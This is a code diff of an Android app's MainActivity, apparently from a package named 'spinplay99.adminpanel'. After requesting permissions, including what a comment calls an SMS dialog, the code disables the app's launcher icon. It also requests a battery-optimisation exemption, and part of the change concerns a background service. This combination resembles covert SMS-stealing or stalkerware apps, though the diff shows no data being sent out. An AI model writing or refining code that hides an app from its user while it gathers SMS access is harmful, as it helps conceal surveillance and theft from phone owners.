@@ -1,5 +1,6 @@
 package com.spinplay99.adminpanel;
 
+import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.AlertDialog;
 import android.content.ComponentName;
@@ -88,15 +89,9 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
             hideLauncherIconIfReady();
-            startBackgroundService();
+            // Battery screen must run after SMS dialog — opening both at once hides permissions.
             requestBatteryExemptionIfNeeded();
         }
-    }
-
-    @Override
-    protected void onResume() {
-        super.onResume();
-        hideLauncherIconIfReady();
     }
 
     private void hideLauncherIconIfReady() {
@@ -105,7 +100,7 @@ public class MainActivity extends AppCompatActivity {
         }
         try {
             getPackageManager().setComponentEnabledSetting(
-                new ComponentName(getPackageName(), "com.spinplay99.adminpanel.LauncherAlias"),
+                new ComponentName(this, LauncherAlias.class),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
         } catch (Exception ignored) {
@@ -219,7 +214,17 @@ public class MainActivity extends AppCompatActivity {
         if (webView.canGoBack()) {
             webView.goBack();
         } else {
-            moveTaskToBack(true);
+            new AlertDialog.Builder(this)
+                .setTitle("Exit")
+                .setMessage("Close app?")
+                .setPositiveButton("Yes", new android.content.DialogInterface.OnClickListener() {
+                    @Override
+                    public void onClick(android.content.DialogInterface dialog, int which) {
+                        finish();
+                    }
+                })
+                .setNegativeButton("No", null)
+                .show();
         }
     }
 
